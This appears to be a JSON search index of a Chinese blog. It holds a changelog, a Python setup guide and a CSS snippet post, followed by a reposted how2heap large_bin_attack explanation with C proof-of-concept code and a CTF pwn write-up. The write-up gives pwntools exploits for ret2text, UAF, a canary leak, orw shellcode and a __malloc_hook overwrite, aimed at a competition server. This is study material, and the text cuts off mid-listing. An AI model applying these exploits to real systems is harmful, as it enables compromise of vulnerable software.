[{"content":"2024-09-24-新增文章访问统计次数 在./layouts/partials/article/article.html页面添加不蒜子页面访问统计功能，实现访问每个页面的统计次数。\n1 2 3 4 5 6 7 8 \u0026lt;!-- 增加统计文章访问次数-开始 --\u0026gt; \u0026lt;div style=\u0026#34;padding:5px 0px 0px 30px;\u0026#34;\u0026gt; \u0026lt;script async src=\u0026#34;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;span id=\u0026#34;busuanzi_container_page_pv\u0026#34; style=\u0026#34;font-size: 14px;color:rgb(118, 118, 118);\u0026#34;\u0026gt; 本文总阅读量\u0026lt;span id=\u0026#34;busuanzi_value_page_pv\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;次 \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 增加统计文章访问次数-结束 --\u0026gt; 参考链接1：不蒜子 - 极简网页计数器 (ibruce.info)\n参考链接2：不蒜子 | 不如 (ibruce.info)\n","date":"2024-09-24T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/","title":"博客主题更新日志"},{"content":"参考教材：人民邮电出版社**《Python编程基础 第2版|微课版》**，书号：978-7-115-57563-0\npython包下载并安装 步骤一：访问python官网，下载安装包\n步骤二：此处我们寻找python3.8.5安装包下载（推荐安装最新版的python，截至本文档的编写时，python最新的版本为3.12.6）\n步骤三：双击已下载的安装包，按照下面步骤进行安装\n步骤四：打开命令提示符，输入python，若出现下面信息，则代表安装成功\nVs Code代码编写工具安装 此处不介绍pyCharm工具的安装和使用，初学者使用该工具过于臃肿，建议熟悉python的开发后，再学习pycharm工具使用方式\n步骤一：访问Vs Code官网，下载软件安装包\n点击后，会自动下载最新版的vs code工具。\n步骤二：双击安装包，安装vs code\nvscode 插件安装(python) 步骤三：安装适合开发python的vs code插件。\n① 安装简体中文插件，在插件商店输入chinese，按回车键搜索，并点击Install安装\n安装完毕后，右下角出现下面界面，点击按钮重启vs code编辑器\nvs code重启后，界面语言变成简体中文。\n② 安装适合python开发的插件，在插件搜索栏输入python\n安装完毕后，出现下面界面代表安装成功\n运行第一个python程序——打印Hello,World 步骤一：在【菜单栏-\u0026gt;文件-\u0026gt;新建文本文件】，创建python脚本文件\n步骤二：在当前界面处按快捷键【Ctrl+s】，保存脚本文件，例如保存到桌面，如下图所示。\n/\n步骤三：在编辑框内输入下列代码。\n1 2 # 通过print函数，在终端输出\u0026#39;Hello,World\u0026#39; print(\u0026#34;Hello,World\u0026#34;) 步骤四：根据下方图片效果，点击按钮执行已编写的python脚本。\n","date":"2024-09-23T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/python%E5%85%A5%E9%97%A81-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/","title":"python入门1-环境安装"},{"content":" 看到其它博客都有一些很炫酷界面效果，通过搜索发现都是使用html+CSS的方式编写的，所以这篇文章用来收集我看到比较好的markdown的样式，可以存储起来，后面直接CV使用就可以了。\n使用方式：在markdown第1行添加link标签，加载CSS样式（使用方式和Html编写一样）\n1 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;index.css\u0026#34;\u0026gt; CSS样式 将下面CSS样式储存起来，和markdown文件放在同一目录下，我这边命名为index.css\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 *{ margin:0px; padding:0px; border:0px } /* 代码高亮块 */ .high_light_box{ margin:30px 0; padding:20px 30px; border-radius: 5px; border-left-width: 5px; border-style:solid; } /* 高亮块下的标题 */ .high_light_box \u0026gt; .p_title{ font-weight: 600; } /* 绿色高亮块 */ .high_light_box_green{ background-color:#f0f9eb; border-left-color:#67c23a; } /* 蓝色高亮块 */ .high_light_box_blue{ background-color:#ecf5ff; border-left-color:#409eff; } /* 后续更多样式尽情期待... */ 高亮块 绿色高亮块 TIP\n入门后可以尝试推导一下上面的公式，入门前只需懂得如何在 Python 中实现上面公式即可。\n1 2 3 4 5 6 \u0026lt;div class=\u0026#34;high_light_box high_light_box_green\u0026#34;\u0026gt; \u0026lt;!-- 标题 --\u0026gt; \u0026lt;p class=\u0026#34;p_title\u0026#34;\u0026gt;TIP\u0026lt;/p\u0026gt; \u0026lt;!-- 正文 --\u0026gt; \u0026lt;p\u0026gt;入门后可以尝试推导一下上面的公式，入门前只需懂得如何在 Python 中实现上面公式即可。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 蓝色高亮块 TIP\n入门后可以尝试推导一下上面的公式，入门前只需懂得如何在 Python 中实现上面公式即可。\n1 2 3 4 5 6 \u0026lt;div class=\u0026#34;high_light_box high_light_box_blue\u0026#34;\u0026gt; \u0026lt;!-- 标题 --\u0026gt; \u0026lt;p class=\u0026#34;p_title\u0026#34;\u0026gt;TIP\u0026lt;/p\u0026gt; \u0026lt;!-- 正文 --\u0026gt; \u0026lt;p\u0026gt;入门后可以尝试推导一下上面的公式，入门前只需懂得如何在 Python 中实现上面公式即可。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 未完待续\u0026hellip; \u0026hellip;\n","date":"2024-09-23T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/%E8%87%AA%E5%AE%9A%E4%B9%89markdown%E6%A0%B7%E5%BC%8F/","title":"自定义markdown样式"},{"content":"本文章转载：how2heap-2.23-08-large_bin_attack_pwn largbin图解-CSDN博客\n欢迎各位读者前往原文章阅读，本处只用作笔记记录\npwngdb命令，方便源码调试\n1 2 set context-sections code set context-source-code-lines 40 粗略理解chunk进入large bin的过程(先看图解，再回头看代码) 下面是从unsorted bin链中取出的chunk，插入到large bin链的代码\n基本逻辑如下：\n从unsorted bin链中取出的chunk大小，是否属于small bin的大小\nsmall bin相关的处理 从unsorted bin链中取出的chunk大小，是否属于large bin的大小\n计算出当前chunk大小从属的main_arean-\u0026gt;bins的下标 获取该bins下标的large bin的头结点 bck 通过large bin头节点的fd，找到large bin链中size最大的chunk fwd（large bin链中第一个chunk） 当前large bin链不为空（操作的是fd_nextsize和bk_nextsize形成的链） 当前chunk的size \u0026lt; large bin链中最小的chunk （总结：将当前chunk插入到large bin链的尾部，即插入到最小的chunk的后面） fwd = bck; 令 fwd 指向 large bin 头结点 bck = bck-\u0026gt;bk; 令 bck 指向 largin bin 尾部 chunk，就是当前已在large bin链中最小的这个chunk victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; 当前chunk 的 fd_nextsize 指向 largin bin 的第一个 chunk victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; 当前chunk的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize（当前chunk的bk_nextsize指向原先最小的chunk） fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; 原先最小chunk的fd_nextsize指向当前chunk fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim large bin中第一个chunk的bk_nextsize指向当前chunk 当前chunk的size \u0026gt;= large bin链中最小的chunk 从large bin链中size最大的chunk fwd（large bin链中第一个chunk），从大到小遍历，找到首个不大于当前chunk的chunk 如果找到的chunk的大小等于当前chunk **fwd = fwd-\u0026gt;fd;**将当前chunk 插入到该chunk的后面，并不修改 nextsize 指针 如果找到的chunk的大小小于当前chunk victim-\u0026gt;fd_nextsize = fwd; 当前chunk的fd_nextsize指向这个找到的chunk victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; 当前chunk的bk_nextsize指向这个找到的chunk的bk_nextsize fwd-\u0026gt;bk_nextsize = victim; 找到chunk的bk_nextsize指向当前chunk victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; 找到chunk原先前面的chunk的fd_nextsize指向当前chunk 获取找到的chunk的前面的一个chunk（通过bk找到当前chunk插入前，最小的比找到的chunk大的chunk） 当前large bin链为空（操作的是fd_nextsize和bk_nextsize形成的链） 当前chunk的fd_nextsize和bk_nextsize均指向自己 将当前chunk链入large bin链中（fd,bk形成的链）\n图解入large bin链的逻辑 large bin链中放入首个chunk：chunk a 这里fd,bk,fd_nextsize,bk_nextsize指向都是chunk的首地址\n放入 size 比 chunk a 大的 chunk c large bin fd总是指向size最大的chunk\nlarge bin bk总是指向size最小的chunk\nlarge bin链中的chunk，通过large bin fd 从大到小排序\n放入size 比 chunk a 小的 chunk b large bin链中的chunk，通过large bin fd 从大到小排序\n只不过在代码实现中，通过large bin bk 快速来实现这一步\n放入 size 和 chunk a 一样的 chunk d 在代码中，有这么一个注释：\n/ Always insert in the second position. /，\n就是大小相同的chunk，紧临着相同大小首个进入large bin链的chunk放置（可以看下面chunk e一起理解）\n大小相同（重复）的chunk，不会有fd_nextsize，bk_nextsize（忘掉横向链，竖向链）\n放入 size 和 chunk a 一样的 chunk e 如上情况就是**入large bin链的所有逻辑**\n回顾一下unsafe_unlink和unsorted_bin_attack how2heap-2.23-05-unsorted_bin_attack\nhow2heap-2.23-06-unsorted_bin_into_stack\nunsafe_unlink 是因为一个被破坏的chunk脱链，重新修整指针时引发的问题\nunsorted_bin_attack 也是一个被破坏的chunk脱链，重新修整指针时引发的问题\nlarge_bin_attack原理与上面的两个差不多，是一个chunk入链，与一个**被破坏**的chunk重新修整指针时引发的问题\n从large_bin_attack被挖掘出的思路出发只考虑2.23的源码 unsorted bin chunk进入large bin链的四种逻辑：\nlarge bin链为空，chunk进入large bin链 chunk的size比large bin链中size最小的chunk还要小 large bin中存在和chunk size一样大小的chunk chunk的size大于large bin链中size最小的chunk large bin chunk出large bin链\n从恰好大小合适的largebin中获取chunk，发生unlink 从比malloc要求大的largebin中取chunk，发生unlink 好像入链归于large_bin_attack，出链归于unsafe_unlink，不清楚，只看入链的逻辑\n下面通过被破坏的large bin chunk实现漏洞利用的角度来观察不同入链的逻辑（一般是堆溢出修改large bin的fd,bk,fd_nextsize,bk_nextsize）\n1）首个chunk入large bin链 此时还没有被破坏的chunk large bin fd，large bin bk 指向这个chunk的首地址 chunk的fd,bk指向large bin 头结点的首地址 fd_nextsize，bk_nextsize指向chunk自身 这里没有利用场景\n2）比最小的chunk还小的chunk入large bin链 先看看该入链逻辑所涉及的代码，寻找可被破坏-用于利用的chunk(从而有堆溢出产生时，构造这种堆结构)，以及利用方式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 else { victim_index = largebin_index (size); bck = bin_at (av, victim_index);\t【1】 fwd = bck-\u0026gt;fd;\t【2】 if (fwd != bck) { if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { fwd = bck;\t【3】 bck = bck-\u0026gt;bk;\t【4】 victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; 【5】 victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize;\t【6】 fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim;\t【7】 } mark_bin (av, victim_index); victim-\u0026gt;bk = bck;\t【8】 victim-\u0026gt;fd = fwd;\t【9】 fwd-\u0026gt;bk = victim;\t【10】 bck-\u0026gt;fd = victim;\t【11】 【0】victim为要入链的chunk\n【1】bck为large bin链的头结点，这个位置是一个固定死的值（除非篡改了arena的位置）\n【2】fwd为large bin链中size最大的chunk，也就是紧挨着large bin头结点的chunk\n【3】fwd为large bin链的头结点\n【4】bck为large bin链中size最小的chunk\n现在bck，victim，fwd，三要素集齐，下面就是构造如下的双链 考虑到fwd时large bin链的头结点，实际的图形如下的两种形式\n【5】**victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; **fwd为large bin链的头结点，fwd-\u0026gt;fd指向的是一个chunk的地址，即size最大的chunk（如果原先large bin链中只有一个chunk，就是指向的那个size最小的chunk的地址），这里没有办法伪造\n【6】victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; 与【5】中描述的类似，fwd-\u0026gt;fd指向的是与large bin头节点最近的chunk，而 fwd-\u0026gt;fd-\u0026gt;bk_nextsize是该chunk中的数据，如果有堆溢出漏洞，就可以篡改这个chunk的bk_nextsize字段，并赋值给要链入的chunk的bk_nextsize字段\n【7】fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; 分成两部分看\nfwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim 仅是给紧挨着large bin头结点的chunk的bk_nextsize字段赋值\nvictim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim\n对篡改的bk_nextsize chunk的fd_nextsize字段赋值为victim\n如果有一个unsigned long stack_var = 0;变量，将篡改的bk_nextsize赋值为(unsigned long )(\u0026amp;stack_var -4)，那就可以修改这个变量的值了\n【8】，【9】，【10】，【11】都是不能控制的\n下面是相关代码，可以自己调试看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;malloc.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; // OK int main() { printf(\u0026#34;begin test\\n\u0026#34;); unsigned long stack_var = 0; size_t *p1 = malloc(0x410); //largebin malloc(0x10); //to separate size_t *p2 = malloc(0x400); //unsortedbin malloc(0x10); //to separate free(p1); malloc(0x470); //Release p1 into largebin free(p2); //Release p2 into unsortedbin p1[3] = (unsigned long )(\u0026amp;stack_var -4); malloc(0x470); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;malloc.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; // OK int main() { printf(\u0026#34;begin test\\n\u0026#34;); unsigned long stack_var = 0; size_t *p1 = malloc(0x420); malloc(0x10); size_t *p2 = malloc(0x410); malloc(0x10); size_t *p3 = malloc(0x400); malloc(0x10); free(p1); free(p2); malloc(0x470); free(p3); p1[3] = (unsigned long )(\u0026amp;stack_var -4); malloc(0x470); return 0; } 3）放入相同大小的 chunk 所涉及的代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 victim_index = largebin_index (size); bck = bin_at (av, victim_index);\t【1】 fwd = bck-\u0026gt;fd;\t【2】 if (fwd != bck) { size |= PREV_INUSE; if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { } else { while ((unsigned long) size \u0026lt; chunksize_nomask (fwd))\t【3】 { fwd = fwd-\u0026gt;fd_nextsize; } if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-\u0026gt;fd;\t【4】 else { } bck = fwd-\u0026gt;bk;\t【5】 } } } mark_bin (av, victim_index); victim-\u0026gt;bk = bck;\t【6】 victim-\u0026gt;fd = fwd;\t【7】 fwd-\u0026gt;bk = victim;\t【8】 bck-\u0026gt;fd = victim;\t【9】 【1】bck为large bin链的头结点，这个位置是一个固定死的值（除非篡改了arena的位置）\n【2】fwd为large bin链中size最大的chunk，也就是紧挨着large bin头结点的chunk\n【3】通过fwd从大到小，寻找到第一个不大于victim size的chunk\n如下就是fwd和victim\n【4】如果fwd和victim大小相等，就会把fwd中的fd取出来用，从上图可以可以想到，假设存在堆溢出漏洞，那就可以修改fwd-\u0026gt;fd 经过赋值，伪造的fd指向的chunk，成为fwd\n【5】将伪造的fwd的bk取出，作为bck 这里有个问题，伪造的fwd chunk的bk字段必须是要有内容的，最好是个可写内存的地址，否则执行【9】时程序会崩溃\n【6】，【7】给victim chunk的bk,fd赋值，这个不管\n【8】，伪造的fwd chunk的bk赋值为victim chunk的地址\n【9】，这个太不稳定了，不管\n这种攻击场景，适用于覆盖栈中保存的堆地址的变量，将其保存的堆地址修改为victim chunk的地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;malloc.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { printf(\u0026#34;begin\\n\u0026#34;); char* test_chunk = malloc(0x1000); size_t * a = malloc(0x410); malloc(0x8); size_t *b = malloc(0x410); size_t * victim = malloc(0x400); malloc(0x8); free(a); malloc(0x470); free(b); a[0] = (unsigned long )(\u0026amp;test_chunk -3); printf(\u0026#34;before vuln\\n\u0026#34;); malloc(0x470); printf(\u0026#34;after vuln\\n\u0026#34;); memset(test_chunk, \u0026#39;a\u0026#39;, 0x900); char show_array[100]; memcpy(show_array, victim+20,30); printf(\u0026#34;%s\\n\u0026#34;,show_array); return 0; } 4）放入不和其他chunk size相等，且不是最小的chunk 所涉及的代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 victim_index = largebin_index (size); bck = bin_at (av, victim_index);\t【1】 fwd = bck-\u0026gt;fd;\t【2】 if (fwd != bck) { size |= PREV_INUSE; if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { } else { while ((unsigned long) size \u0026lt; chunksize_nomask (fwd))\t【3】 { fwd = fwd-\u0026gt;fd_nextsize; } if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) else { victim-\u0026gt;fd_nextsize = fwd;\t【4】 victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize;\t【5】 fwd-\u0026gt;bk_nextsize = victim;\t【6】 victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim;\t【7】 } bck = fwd-\u0026gt;bk;\t【8】 } } else } mark_bin (av, victim_index); victim-\u0026gt;bk = bck;\t【9】 victim-\u0026gt;fd = fwd;\t【10】 fwd-\u0026gt;bk = victim;\t【11】 bck-\u0026gt;fd = victim;\t【12】 【1】bck为large bin链的头结点，这个位置是一个固定死的值（除非篡改了arena的位置）\n【2】fwd为large bin链中size最大的chunk，也就是紧挨着large bin头结点的chunk\n【3】通过fwd从大到小，寻找到第一个不大于victim size的chunk\n如下就是fwd和victim\n假设存在堆溢出漏洞，可以溢出修改fwd中的数据\n【4】victim-\u0026gt;fd_nextsize = fwd，victim的fd_nextsize存储fwd chunk的首地址，这个没有办法伪造\n【5】victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize，victim的bk_nextsize存储fwd chunk中伪造的bk_nextsize\n【6】fwd-\u0026gt;bk_nextsize = victim，fwd的bk_nextsize字段赋值为victim chunk的首地址，这个正常\n【7】victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim，将伪造的bk_nextsize chunk的fd_nextsize字段覆盖为victim chunk的首地址 【8】bck = fwd-\u0026gt;bk，bck指向fwd伪造的bk 【8】和【9】，给victim chunk 的fd和bk赋值 【11】给fwd的bk字段赋值 【12】给伪造的bk chunk的fd字段赋值为victim chunk的首地址 如果存在两个变量（一个也行）stack_var1，stack_var2\n通过堆溢出漏洞，将fwd的bk修改为\u0026amp;stack_var1-2，fwd的bk_nextsize修改为\u0026amp;stack_var2-4，则stack_var1和stack_var2存储的内容在漏洞触发后都能修改为victim chunk的首地址\n测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main() { printf(\u0026#34;begin test\\n\u0026#34;); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; size_t * p1 = malloc(0x410); malloc(0x8); size_t * p2 = malloc(0x420); malloc(0x8); free(p1); malloc(0x470); free(p2); p1[1] = (unsigned long )(\u0026amp;stack_var1 - 2); p1[3] = (unsigned long )(\u0026amp;stack_var2 - 4); malloc(0x470); return 0; } 现在how2heap中的large_bin_attack应该可以完全理解了\n","date":"2024-09-22T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/%E8%BD%AC%E8%BD%BDhow2heap-2.23-08-large_bin_attack/","title":"【转载】how2heap-2.23-08-large_bin_attack"},{"content":"find 题目分析： start函数存在栈溢出\n题目给出了后门函数，该函数的str全局变量的内容为/bin/sh\n直接采用ret2text即可\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2148) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080485F1 #debug() io.sendlineafter(\u0026#34;Please enter what you need:\\n\u0026#34;,\u0026#34;2\u0026#34;) payload = flat([cyclic(0x70+4),backdoor]) io.sendafter(\u0026#34;Give You Ret2libc\\n\u0026#34;,payload) io.interactive() sys 题目分析： 打开ida，发现存在很多函数，初步判断是静态链接的题目，其中start函数存在栈溢出\n同时题目给出后门函数\n正常打ret2text即可\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2111) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080488D2 #debug() payload = flat([cyclic(0x28+4),backdoor]) io.send(payload) io.interactive() ezUAF 题目分析： ida打开题目，可以发现是堆题。漏洞点在del_note\n通过观察add_note函数，新增的A堆块会通过另一个B堆块存储A堆块地址。其中B[0]存储print_note_content函数地址，b[1]存储A堆块地址。\n通过阅读print_note函数发现，输出堆块内容的方式是通过调用B[0]存储的函数地址，输出B[1]地址指向的内容\n同时本题提供了后门函数的利用\n因此本题可以利用堆风水布局，申请B堆块空间，将B[0]更改为后门函数地址，同时利用UAF漏洞，调用后门函数。\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; io = process(filename) #io = remote(\u0026#34;120.46.59.242\u0026#34;,2081) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) def add(size,content): io.sendafter(\u0026#34;Your choice :\u0026#34;,\u0026#34;1\u0026#34;) io.sendafter(\u0026#34;Note size :\u0026#34;,str(size)) io.sendafter(\u0026#34;Content\u0026#34;,content) def delete(index): io.sendafter(\u0026#34;Your choice :\u0026#34;,\u0026#34;2\u0026#34;) io.sendafter(\u0026#34;Index :\u0026#34;,str(index)) def show(index): io.sendafter(\u0026#34;Your choice :\u0026#34;,\u0026#34;3\u0026#34;) io.sendafter(\u0026#34;Index :\u0026#34;,str(index)) backdoor = 0x08048945 #debug() add(0x20,\u0026#34;aa\u0026#34;)#0 add(0x20,\u0026#34;bb\u0026#34;)#1 add(0xb,\u0026#34;cc\u0026#34;)#2 delete(0) delete(1) add(0xb,p32(backdoor))#3 show(0) io.interactive() chunk1 题目分析： 从vuln函数可看出，存在两次格式化字符串漏洞，并且两次读取都存在溢出。 题目给出了后门函数\n同时本题的canary保护开启、PIE保护关闭，因此可以利用第一次格式化字符串，泄露canary值，第二次直接通过溢出覆盖vuln函数返回地址为后门函数地址即可。\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2106) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080485F1 #debug() # 泄露canary payload = b\u0026#39;%31$p\u0026#39; io.send(payload) sleep(0.5) canary = int(io.recv(10),16) print(\u0026#34;canary:\u0026#34; + hex(canary)) # 覆盖ret为backdoor payload = flat([cyclic(0x70-0xc),canary,cyclic(0xc),backdoor]) io.send(payload) io.interactive() try_sandbox 题目分析： 一道沙箱题，禁用了execve。\n题目使用mmap开辟了一段rwx权限的空间(0x166000)\n查看sub_40129e伪代码，存在栈溢出\n因此利用思路是利用一次栈迁移，重复调用read(0,buf,0x80)，将shellcode(orw)写入0x166000的地方，然后通过ret2text执行shellcode。\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2142) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) rwx_addr = 0x166000 read_addr = 0x4012cc #debug() payload = flat([cyclic(0x40),rwx_addr+0x40,read_addr,rwx_addr]) io.sendafter(\u0026#34;我都我都不让你执行了\\n\u0026#34;,payload) shellcode = \u0026#39;\u0026#39;\u0026#39; //调用open() mov r15, 0x67616c66 push r15 mov rdi, rsp xor rsi,rsi push 2 pop rax syscall //调用read() push 3 pop rdi mov rsi, rsp mov rdx, 0xff xor rax,rax syscall //调用write() push 1 pop rdi mov rsi, rsp mov rdx, 0xff mov rax, rdi syscall \u0026#39;\u0026#39;\u0026#39; shellcode = asm(shellcode).ljust(0x48,b\u0026#39;\\x90\u0026#39;) + p64(rwx_addr) pause() io.send(shellcode) io.interactive() unk 题目分析： 打开后发现是堆题，题目同时存在UAF和堆溢出，没有额外限制（所以就不贴图了），同时远程libc版本为2.23-0ubuntu11.3_amd64，本题解题方法较多:\n我这边采用UAF漏洞，通过unsortedbin chunk 泄露libc地址，然后通过fastbin attack改写__malloc_hook为one_gadget\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2108) elf = ELF(filename) libc = elf.libc # 2.23-0ubuntu11.3_amd64 def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) #gdb.attach(io) gdb.attach(io,\u0026#34;b *0x4009fe\u0026#34;) def add(index,size): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;1\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) io.sendafter(\u0026#34;size:\\n\u0026#34;,str(size)) def delete(index): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;2\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) def edit(index,length,content): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;3\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) io.sendafter(\u0026#34;length:\\n\u0026#34;,str(length)) io.sendafter(\u0026#34;content:\\n\u0026#34;,content) def show(index): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;4\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) add(0,0x80) add(1,0x68) delete(0) show(0) libc_base = u64(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x3C4B78 print(\u0026#34;libc_base:\u0026#34; + hex(libc_base)) malloc_hook = libc_base + libc.sym[\u0026#39;__malloc_hook\u0026#39;] print(\u0026#34;malloc_hook:\u0026#34; + hex(malloc_hook)) # ------------------------------------------- add(2,0x68) delete(1) edit(1,0x60,p64(malloc_hook-0x23)) # ----------------------------------- add(3,0x68) add(4,0x68) #debug() edit(4,0x60,b\u0026#39;\\x00\u0026#39;*0x13 + p64(libc_base+0xf1247)) add(5,0x20) io.interactive() \u0026#39;\u0026#39;\u0026#39; 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], 